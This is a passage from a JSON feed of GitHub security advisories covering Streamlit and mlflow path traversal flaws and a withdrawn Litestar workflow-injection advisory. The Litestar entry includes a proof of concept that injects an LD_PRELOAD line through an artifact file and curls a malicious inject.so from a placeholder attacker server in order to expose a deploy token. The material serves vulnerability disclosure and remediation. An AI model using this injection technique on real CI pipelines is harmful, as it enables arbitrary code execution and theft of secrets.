            "content_html": "<h3 id=\"1-impacted-products\">1. Impacted Products</h3>\n<p>Streamilt Open Source versions before 1.37.0.</p>\n<h3 id=\"2-introduction\">2. Introduction</h3>\n<p>Snowflake Streamlit open source addressed a security vulnerability via the <a href=\"https://docs.streamlit.io/develop/concepts/configuration/serving-static-files\">static file sharing feature</a>. The vulnerability was patched on Jul 25, 2024, as part of Streamlit open source version 1.37.0. The vulnerability only affects Windows.</p>\n<h3 id=\"3-path-traversal-vulnerability\">3. Path Traversal Vulnerability</h3>\n<h4 id=\"31-description\">3.1 Description</h4>\n<p>On May 12, 2024, Streamlit was informed via our bug bounty program about a path traversal vulnerability in the open source library. We fixed and merged a patch remediating the vulnerability on Jul 25, 2024. The issue was determined to be in the moderate severity range with a maximum CVSSv3 base score of <a href=\"https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N\">5.9</a></p>\n<h4 id=\"32-scenarios-and-attack-vectors\">3.2 Scenarios and attack vector(s)</h4>\n<p>Users of hosted Streamlit app(s) on Windows were vulnerable to a path traversal vulnerability when the <a href=\"https://docs.streamlit.io/develop/concepts/configuration/serving-static-files\">static file sharing feature</a> is enabled. An attacker could utilize the vulnerability to leak the password hash of the Windows user running Streamlit. </p>\n<h4 id=\"33-resolution\">3.3 Resolution</h4>\n<p>The vulnerability has been fixed in all Streamlit versions released since Jul 25, 2024. We recommend all users upgrade to Version 1.37.0.</p>\n<h3 id=\"4-contact\">4. Contact</h3>\n<p>Please contact <a href=\"mailto:security@snowflake.com\">security@snowflake.com</a> if you have any questions regarding this advisory. If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href=\"https://hackerone.com/snowflake?type=team\">Vulnerability Disclosure Policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/streamlit/streamlit/security/advisories/GHSA-rxff-vr5r-8cj5\">https://github.com/streamlit/streamlit/security/advisories/GHSA-rxff-vr5r-8cj5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42474\">https://nvd.nist.gov/vuln/detail/CVE-2024-42474</a></li>\n<li><a href=\"https://github.com/streamlit/streamlit/commit/3a639859cfdfba2187c81897d44a3e33825eb0a3\">https://github.com/streamlit/streamlit/commit/3a639859cfdfba2187c81897d44a3e33825eb0a3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rxff-vr5r-8cj5\">https://github.com/advisories/GHSA-rxff-vr5r-8cj5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rxff-vr5r-8cj5",
            "title": "[streamlit] Path traveral in Streamlit on windows",
            "date_modified": "2024-08-12T18:35:14.000Z",
            "date_published": "2024-08-12T18:35:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rxff-vr5r-8cj5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"withdrawn-advisory\">Withdrawn Advisory</h2>\n<p>This advisory has been withdrawn because the confidentiality, integrity, and availability impacts of the vulnerability affect Litestar's CI/CD environment rather than the <code>litestar</code> package. While the information in the advisory is still valid, users of the <code>litestar</code> package are not affected and do not need to receive Dependabot alerts.</p>\n<h2 id=\"original-advisory\">Original Advisory</h2>\n<h3 id=\"summary\">Summary</h3>\n<p>Litestar's <code>docs-preview.yml</code> workflow is vulnerable to Environment Variable injection which may lead to secret exfiltration and repository manipulation.</p>\n<h3 id=\"environment-variable-injection-ghsl-2024-177\">Environment Variable injection (<code>GHSL-2024-177</code>)</h3>\n<p>The <a href=\"https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml\"><code>docs-preview.yml</code> workflow</a> gets triggered when the <code>Tests And Linting</code> workflow completes:</p>\n<pre><code class=\"language-yaml\">on:\n  workflow_run:\n    workflows: [Tests And Linting]\n    types: [completed]\n</code></pre>\n<p>Later, it downloads and extracts an artifact generated by the triggering workflow:</p>\n<pre><code class=\"language-yaml\">- name: Download artifact\nuses: dawidd6/action-download-artifact@v6\nwith:\n  workflow_conclusion: success\n  run_id: ${{ github.event.workflow_run.id }}\n  path: docs-preview\n  name: docs-preview\n</code></pre>\n<p>And reads <code>docs-preview/.pr_number</code> into an Environment Variable:</p>\n<pre><code class=\"language-yaml\">- name: Set PR number\n  run: echo \"PR_NUMBER=$(cat docs-preview/.pr_number)\" &gt;&gt; $GITHUB_ENV\n</code></pre>\n<p>The <code>$GITHUB_ENV</code> pointed file is just a regular file where every <code>KEY=VALUE</code> will be used to define a new Environment Variable after the step completes. Since the contents of the <code>.pr_number</code> file have not been validated, they may contain new lines that will cause new Environment Variables to be defined.</p>\n<p>An attacker can send a malicious <code>.pr_number</code> file with the following content:</p>\n<pre><code class=\"language-txt\">111\nLD_PRELOAD=/home/runner/work/litestar/litestar/inject.so\n</code></pre>\n<p>Which will result in two Environment Variables being defined:</p>\n<ul>\n<li>PR_NUMBER=111</li>\n<li>LD_PRELOAD=/home/runner/work/litestar/litestar/inject.so</li>\n</ul>\n<p>In this example we are manipulating the <code>LD_PRELOAD</code> environment variable to force the system to load a malicious shared library called <code>inject.so</code>. As a result, all subsequent processes launched will automatically incorporate this compromised library into their execution environment.</p>\n<p>The following step will run the <code>JamesIves/github-pages-deploy-action</code> action which will <a href=\"https://github.com/JamesIves/github-pages-deploy-action/blob/2c9a889f39c2410b2ca1342f465a53a7c5c389b4/action.yml#L5\">run the <code>node</code> command</a>. Therefore the <code>LD_PRELOAD</code> will execute arbitrary code when <code>node</code> gets executed:</p>\n<pre><code class=\"language-yaml\">- name: Deploy docs preview\n  uses: JamesIves/github-pages-deploy-action@v4\n  with:\n    folder: docs-preview/docs/_build/html\n    token: ${{ secrets.DOCS_PREVIEW_DEPLOY_TOKEN }}\n    repository-name: litestar-org/litestar-docs-preview\n    clean: false\n    target-folder: ${{ env.PR_NUMBER }}\n    branch: gh-pages\n</code></pre>\n<h4 id=\"poc\">PoC</h4>\n<ul>\n<li>Clone the repository</li>\n<li>Edit the <code>ci.yml</code> workflow.</li>\n</ul>\n<pre><code class=\"language-yaml\">name: Tests And Linting\n\non:\n  pull_request:\n\njobs:\n  upload-patch:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    steps:\n      - name: Save PR number and payload\n        run: |\n          make payload\n          echo -e \"${{ github.event.number }}\\nLD_PRELOAD=/home/runner/work/litestar/litestar/inject.so\" &gt; payload/.pr_number\n          curl http://&lt;ATTACKER SERVER&gt;/inject.so -o payload/inject.so\n\n      - name: Upload artifact\n        uses: actions/upload-artifact@v3\n        with:\n          name: docs-preview\n          path: payload\n</code></pre>\n<ul>\n<li>Create a Pull Request with this change.</li>\n<li>Since the modified workflow is triggered on <code>pull_request</code>, the attacker Pull Request will trigger it and upon completion will trigger the vulnerable <code>Deploy documentation preview</code> workflow which will read the malicious artifact and pollute the Environment Variables.</li>\n</ul>\n<h4 id=\"impact\">Impact</h4>\n<p>This issue will grant a malicious actor the <a href=\"https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17\">following permissions</a>:</p>\n<pre><code>  Issues: write\n  Metadata: read\n  PullRequests: write\n</code></pre>\n<p>In addition, the following secret will get exposed to the attacker: <code>DOCS_PREVIEW_DEPLOY_TOKEN</code></p>\n<h4 id=\"remediation\">Remediation</h4>\n<ul>\n<li>Verify the contents of the downloaded artifacts.</li>\n<li>Do not allow new lines in the value redirected to GITHUB_ENV</li>\n</ul>\n<h3 id=\"resources\">Resources</h3>\n<ul>\n<li><a href=\"https://codeql.github.com/codeql-query-help/javascript/js-actions-command-injection/\">CodeQL for JavaScript - Expression injection in Actions</a></li>\n<li><a href=\"https://securitylab.github.com/research/github-actions-untrusted-input/\">Keeping your GitHub Actions and workflows secure Part 2: Untrusted input</a></li>\n<li><a href=\"https://securitylab.github.com/research/github-actions-preventing-pwn-requests/\">Keeping your GitHub Actions and workflows secure Part 1: Preventing pwn requests</a></li>\n</ul>\n<h2 id=\"disclosure-policy\">Disclosure Policy</h2>\n<p>This report is subject to a 90-day disclosure deadline, as described in more detail in our <a href=\"https://securitylab.github.com/advisories#policy\">coordinated disclosure policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7\">https://github.com/litestar-org/litestar/security/advisories/GHSA-4hq2-rpgc-r8r7</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b\">https://github.com/litestar-org/litestar/commit/84d351e96aaa2a1338006d6e7221eded161f517b</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml\">https://github.com/litestar-org/litestar/blob/ffaf5616b19f6f0f4128209c8b49dbcb41568aa2/.github/workflows/docs-preview.yml</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42370\">https://nvd.nist.gov/vuln/detail/CVE-2024-42370</a></li>\n<li><a href=\"https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17\">https://github.com/litestar-org/litestar/actions/runs/10081936962/job/27875077668#step:1:17</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4hq2-rpgc-r8r7\">https://github.com/advisories/GHSA-4hq2-rpgc-r8r7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4hq2-rpgc-r8r7",
            "title": "[litestar] Withdrawn Advisory: Litestar has an environment Variable injection in `docs-preview.yml` workflow",
            "date_modified": "2024-08-20T18:37:03.000Z",
            "date_published": "2024-08-09T19:22:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4hq2-rpgc-r8r7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A path traversal vulnerability exists in the <code>_create_model_version()</code> function within <code>server/handlers.py</code> of the mlflow/mlflow repository, due to improper validation of the <code>source</code> parameter. Attackers can exploit this vulnerability by crafting a <code>source</code> parameter that bypasses the <code>_validate_non_local_source_contains_relative_paths(source)</code> function's checks, allowing for arbitrary file read access on the server. The issue arises from the handling of unquoted URL characters and the subsequent misuse of the original <code>source</code> value for model version creation, leading to the exposure of sensitive files when interacting with the <code>/model-versions/get-artifact</code> handler.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1558\">https://nvd.nist.gov/vuln/detail/CVE-2024-1558</a></li>\n<li><a href=\"https://huntr.com/bounties/7f4dbcc5-b6b3-43dd-b310-e2d0556a8081\">https://huntr.com/bounties/7f4dbcc5-b6b3-43dd-b310-e2d0556a8081</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j62r-wxqq-f3gf\">https://github.com/advisories/GHSA-j62r-wxqq-f3gf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j62r-wxqq-f3gf",
            "title": "[mlflow] mlflow vulnerable to Path Traversal",
            "date_modified": "2024-08-09T18:07:48.000Z",
            "date_published": "2024-04-16T00:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j62r-wxqq-f3gf"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}